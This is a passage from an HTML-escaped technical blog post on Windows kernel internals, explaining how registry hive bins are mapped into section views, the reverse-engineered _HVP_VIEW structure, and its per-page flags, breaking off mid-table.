 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiTuUvYZQNPVdfvmgXJ3hZD2jkrKCL0sLjCfoTfBC1LDW52m4zNpR7GffCZZ4kUwO0rFIQr0jKfhWqKHpqROqrMW5oOovM75P6gdM-hwUwxYKYHK5z5BMvPFemvTybE9PNmJORN27zhr2WVOa3orx5V3oW8njq2DFT2idGnipovJVhtC-EBBXfnEg06gk/s1200/image5.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiTuUvYZQNPVdfvmgXJ3hZD2jkrKCL0sLjCfoTfBC1LDW52m4zNpR7GffCZZ4kUwO0rFIQr0jKfhWqKHpqROqrMW5oOovM75P6gdM-hwUwxYKYHK5z5BMvPFemvTybE9PNmJORN27zhr2WVOa3orx5V3oW8njq2DFT2idGnipovJVhtC-EBBXfnEg06gk/s1200/image5.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the initial section view layout for a sample Windows Registry hive. The top section shows the hive layout with Header, Bin 1 (256 KB), Bin 2 (2 MB), and Bin 3 (128 KB). The bottom section shows the corresponding initial kernel mapping: View 1 (1.996 MiB) spanning Bin 1 and most of Bin 2, and View 2 (388 KiB) spanning the end of Bin 2 and Bin 3.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the initial section view layout for a sample Windows Registry hive. The top section shows the hive layout with Header, Bin 1 (256 KB), Bin 2 (2 MB), and Bin 3 (128 KB). The bottom section shows the corresponding initial kernel mapping: View 1 (1.996 MiB) spanning Bin 1 and most of Bin 2, and View 2 (388 KiB) spanning the end of Bin 2 and Bin 3.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;As we can see, at this point, the kernel doesn&amp;#39;t concern itself with bin boundaries or continuity: all it needs to achieve is to make every page of the hive accessible through a section view for log recovery purposes. In simple terms, the way that HvpViewMapStart (or more specifically, HvpViewMapCreateViewsForRegion) works is it creates as many 2 MiB views as necessary, followed by one last view that covers the remaining part of the file. So in our example, we have the first view that covers bin 1 and the beginning of bin 2, and the second view that covers the trailing part of bin 2 and the entire bin 3. It&amp;#39;s important to note that memory continuity is only guaranteed within the scope of a single view, and views 1 and 2 may be mapped at completely different locations in the virtual address space.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Later in step 6, the system ensures that every bin is mapped as a contiguous block of memory before handing off the hive to the client. This is done by iterating through all the bins, and for every bin that spans more than one view in the current view map, the following operations are performed:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_sjd249b6zrqw-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;If the start and/or the end of the bin fall into the middle of existing views, these views are truncated from either side. Furthermore, if there are any views that are fully covered by the bin, they are freed and removed from the tree.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A new, dedicated section view is created for the bin and inserted into the view tree.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In our hypothetical scenario, the resulting view layout would be as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmc_KkJaExe8Vfkwfj8CF9-yH18v_DnuxuZosaHxRTfmxgppFDz3um9WC7NlOeH3I8ShvUK-aRuXfyuJWnYbsV658dG7lk67kj5Q4oHE4-sLCBo3znyXzzEDjxKsmWtf5HGVdVt4sl0CmYrojlGZim72ypaHRf_14wypnTdjSYExHs5JGQVuAOLyPoZ8Q/s1200/image12.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmc_KkJaExe8Vfkwfj8CF9-yH18v_DnuxuZosaHxRTfmxgppFDz3um9WC7NlOeH3I8ShvUK-aRuXfyuJWnYbsV658dG7lk67kj5Q4oHE4-sLCBo3znyXzzEDjxKsmWtf5HGVdVt4sl0CmYrojlGZim72ypaHRf_14wypnTdjSYExHs5JGQVuAOLyPoZ8Q/s1200/image12.png&quot; border=&quot;0&quot; alt=&quot;Diagram showing a Windows Registry hive layout divided into Header, Bin 1 (256KB), Bin 2 (2MB), and Bin 3 (128KB), with a corresponding section view layout illustrating how View 1, View 2, and View 3 map onto these bins.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram showing a Windows Registry hive layout divided into Header, Bin 1 (256KB), Bin 2 (2MB), and Bin 3 (128KB), with a corresponding section view layout illustrating how View 1, View 2, and View 3 map onto these bins.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;As we can see, the kernel shrinks views 1 and 2, and creates a new view 3 corresponding to bin 2 to fill the gap. The final layout of the binary tree of section view descriptors is illustrated below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEn3ezfZPi1NDmErHLk1Y36SK663Fqj7A0PAyu78FM0dekYMIu_fvN3Fq7t4lLjxUPm1VMuPgDVjfFQWxMGxqvPAcmT7C2JwjrnzpLcy39ViRrAQYpP7xlhZO-rw1lN8wbg65z3xDwxDW2qRxWIuTmYmV1XpKHcc2JiPT0yg6CcE_oD7RGLNHuuNCxBJc/s1200/image7.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEn3ezfZPi1NDmErHLk1Y36SK663Fqj7A0PAyu78FM0dekYMIu_fvN3Fq7t4lLjxUPm1VMuPgDVjfFQWxMGxqvPAcmT7C2JwjrnzpLcy39ViRrAQYpP7xlhZO-rw1lN8wbg65z3xDwxDW2qRxWIuTmYmV1XpKHcc2JiPT0yg6CcE_oD7RGLNHuuNCxBJc/s1200/image7.png&quot; border=&quot;0&quot; alt=&quot;Diagram showing the final binary tree layout of section view descriptors for a Windows Registry hive. View 3 is the root node, with View 1 as the left child and View 2 as the right child. Each node box displays the specific valid and overall memory address ranges (in hexadecimal) associated with that view descriptor.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram showing the final binary tree layout of section view descriptors for a Windows Registry hive. View 3 is the root node, with View 1 as the left child and View 2 as the right child. Each node box displays the specific valid and overall memory address ranges (in hexadecimal) associated with that view descriptor.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Knowing this, we can finally examine the structure of a single view tree entry. It is not included in the public symbols, but I named it _HVP_VIEW. My reverse-engineered version of its definition is as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_HVP_VIEW&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;RTL_BALANCED_NODE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Node;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;LARGE_INTEGER&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;ViewStartOffset;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;LARGE_INTEGER&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;ViewEndOffset;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;SSIZE_T&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;ValidStartOffset;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;SSIZE_T&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;ValidEndOffset;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;PBYTE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;MappingAddress;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;SIZE_T&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;LockedPageCount;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_HVP_VIEW_PAGE_FLAGS&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;PageFlags[];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The role of each particular field is documented below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_kahfkmaienq0-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Node:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This is the structure used to link all of the entries into a single red-black tree, passed to helper kernel functions such as RtlRbInsertNodeEx and RtlRbRemoveNode.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ViewStartOffset&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ViewEndOffset:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This offset pair specifies the overall byte range covered by the underlying section view object in the hive file. Their difference corresponds to the cumulative length of the red and green boxes in a single row in the diagrams above.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ValidStartOffset&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ValidEndOffset:&lt;/span&gt;&lt;span&gt;&amp;nbsp;This offset pair specifies the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;valid&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;range of the hive accessible through this view, i.e. the green rectangles in the diagrams. It must always be a subset of the [ViewStartOffset, ViewEndOffset] range, and may dynamically change while re-mapping bins (as just shown in this section), as well as when shrinking and extending the hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MappingAddress:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This is the base address of the section view mapping in memory, as returned by ZwMapViewOfSection. It is valid in the context of the process specified by _HVP_VIEW_MAP.ProcessTuple (currently always the &amp;quot;Registry&amp;quot; process). It covers the entire range between [ViewStartOffset, ViewEndOffset], but only pages between [ValidStartOffset, ValidEndOffset] are accessible, and the rest of the section view is marked as PAGE_NOACCESS.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;LockedPageCount:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Specifies the number of pages locked in virtual memory using ZwLockVirtualMemory within this view.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;PageFlags:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;A variable-length array that specifies a set of flags for each memory page in the [ViewStartOffset, ViewEndOffset] range.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;I haven&amp;#39;t found any (un)official sources documenting the set of supported page flags, so below is my attempt to name them and explain their meaning:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c5 tTszyzmaCA-c7 tTszyzmaCA-c46&quot;&gt;Flag&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c46 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c46 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;VIEW_PAGE_VALID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;0x1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Indicates if the page is valid &amp;ndash; true for pages between [ValidStartOffset, ValidEndOffset], false otherwise. If this flag is clear, all other flags are irrelevant/unused.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is set:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_o7h24lqlh2ds-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When creating section views during hive loading, first the initial ones in HvpViewMapStart, and then the bin-specific ones in HvpRemapAndEnlistHiveBins.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When extending an active hive in HvpViewMapExtendStorage.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is cleared:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_etb3tue10oz0-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When trimming the existing views in HvpRemapAndEnlistHiveBins to make room for new ones.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When shrinking the hive in HvpViewMapShrinkStorage.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;VIEW_PAGE_COW_BY_CALLER&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;0x2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Indicates if the kernel maintains a copy of the page through the copy-on-write (CoW) mechanism, as initiated by a client action, e.g. a registry operation that modified data in a cell and thus resulted in marking the page as dirty.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is set:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_u8gl45uj8k5w-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When dirtying a hive cell, in HvpViewMapMakeViewRangeCOWByCaller.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is cleared:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_1zxa3b55tidx-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;When flushing the registry changes to disk, in HvpViewMapMakeViewRangeUnCOWByCaller.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;VIEW_PAGE_COW_BY_POLICY&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;0x4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
